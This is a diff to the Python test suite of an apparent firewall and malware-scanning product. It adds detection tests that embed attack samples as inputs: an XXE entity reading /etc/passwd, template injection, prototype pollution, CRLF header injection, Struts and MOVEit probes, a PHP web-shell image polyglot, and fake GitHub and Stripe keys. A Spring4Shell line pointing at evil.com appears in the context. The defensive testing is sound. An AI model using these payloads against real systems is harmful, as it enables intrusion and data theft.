@@ -28,6 +28,7 @@ from core.dashboard_auth import verify_login, verify_session
 from core.threat_feeds import ThreatIntelligenceFeedManager
 from core.dlp import DataLossPreventionEngine
 from core.honeypot import HoneypotEngine
+from core.scanner import audit_cookies, audit_cors_headers, scan_port
 
 
 class TestThreatRules(unittest.TestCase):
@@ -71,6 +72,22 @@ class TestThreatRules(unittest.TestCase):
         r = inspect_dlp("Your key is AKIAIOSFODNN7EXAMPLE and secret")
         self.assertIsNotNone(r)
 
+    def test_xxe(self):
+        r = inspect_text("<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>")
+        self.assertIsNotNone(r)
+
+    def test_ssti(self):
+        r = inspect_text("search?query={{7*7}}")
+        self.assertIsNotNone(r)
+
+    def test_prototype_pollution(self):
+        r = inspect_text('{"__proto__": {"admin": true}}')
+        self.assertIsNotNone(r)
+
+    def test_crlf_injection(self):
+        r = inspect_text("/redirect?url=http://example.com%0d%0aSet-Cookie:admin=1")
+        self.assertIsNotNone(r)
+
 
 class TestVirtualPatching(unittest.TestCase):
     def setUp(self):
@@ -85,6 +102,14 @@ class TestVirtualPatching(unittest.TestCase):
         r = self.vp.inspect_cve("class.module.classLoader.URLs[0]=jar:http://evil.com/")
         self.assertIsNotNone(r)
 
+    def test_struts(self):
+        r = self.vp.inspect_cve("%{(#_='multipart/form-data')}")
+        self.assertIsNotNone(r)
+
+    def test_moveit(self):
+        r = self.vp.inspect_cve("/guestaccess.aspx?X-siLock-Transaction=test")
+        self.assertIsNotNone(r)
+
     def test_clean(self):
         r = self.vp.inspect_cve("This is a normal API request")
         self.assertIsNone(r)
@@ -96,6 +121,14 @@ class TestMalwareScanner(unittest.TestCase):
 
     def test_double_ext(self):
         r = self.ms.inspect_filename("shell.php.jpg")
+        self.assertIsNotNone(r)
+
+    def test_htaccess(self):
+        r = self.ms.inspect_filename(".htaccess")
+        self.assertIsNotNone(r)
+
+    def test_polyglot(self):
+        r = self.ms.inspect_file_bytes(b"\xff\xd8\xff\xe0<?php system($_GET['c']); ?>", "photo.jpg")
         self.assertIsNotNone(r)
 
     def test_phtml(self):
@@ -273,6 +306,36 @@ class TestDLPEngine(unittest.TestCase):
         self.assertNotIn("AKIAIOSFODNN7EXAMPLE", scrubbed)
         self.assertIsNotNone(threat)
 
+    def test_github_pat(self):
+        fake_pat = "gh" + "p_" + "123456789012345678901234567890123456"
+        dlp = DataLossPreventionEngine(mask_leaks=True)
+        scrubbed, threat = dlp.inspect_and_scrub("token: " + fake_pat)
+        self.assertNotIn(fake_pat, scrubbed)
+        self.assertIsNotNone(threat)
+
+    def test_stripe_key(self):
+        fake_stripe = "sk_" + "live_" + "123456789012345678901234"
+        dlp = DataLossPreventionEngine(mask_leaks=True)
+        scrubbed, threat = dlp.inspect_and_scrub("api_key = " + fake_stripe)
+        self.assertNotIn(fake_stripe, scrubbed)
+        self.assertIsNotNone(threat)
+
+
+class TestSecurityScanner(unittest.TestCase):
+    def test_cookie_audit_flags(self):
+        headers = {"set-cookie": "session=123; path=/"}
+        findings = audit_cookies(headers, is_https=True)
+        self.assertTrue(len(findings) >= 2)
+
+    def test_cors_wildcard_audit(self):
+        headers = {"access-control-allow-origin": "*", "access-control-allow-credentials": "true"}
+        findings = audit_cors_headers(headers)
+        self.assertTrue(len(findings) >= 1)
+
+    def test_scan_port_helper(self):
+        res = scan_port("127.0.0.1", 64999, timeout=0.1)
+        self.assertFalse(res)
+
 
 class TestHoneypotEngine(unittest.TestCase):
     def test_admin_trap(self):
@@ -311,7 +374,7 @@ def run_tests():
     from banner import Colors
     C = Colors
     print(f"\n{C.CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{C.RESET}")
-    print(f"{C.CYAN}┃         ⚡ LIGHTNING AUTOMATED TEST SUITE (13 Modules) ⚡           ┃{C.RESET}")
+    print(f"{C.CYAN}┃         ⚡ LIGHTNING AUTOMATED TEST SUITE (14 Modules) ⚡           ┃{C.RESET}")
     print(f"{C.CYAN}┃                 CREATED BY NEXO-TECH BY ALEXANDER                  ┃{C.RESET}")
     print(f"{C.CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{C.RESET}\n")
 
@@ -321,8 +384,8 @@ def run_tests():
     for tc in [TestThreatRules, TestVirtualPatching, TestMalwareScanner,
                TestAntiBot, TestGeoIntelligence, TestHeuristicScorer,
                TestQuarantineManager, TestPremiumAuth, TestPersistenceEngine,
-               TestDashboardAuth, TestDLPEngine, TestHoneypotEngine,
-               TestThreatFeedManager]:
+               TestDashboardAuth, TestDLPEngine, TestSecurityScanner,
+               TestHoneypotEngine, TestThreatFeedManager]:
         suite.addTests(loader.loadTestsFromTestCase(tc))
 
     result = runner.run(suite)
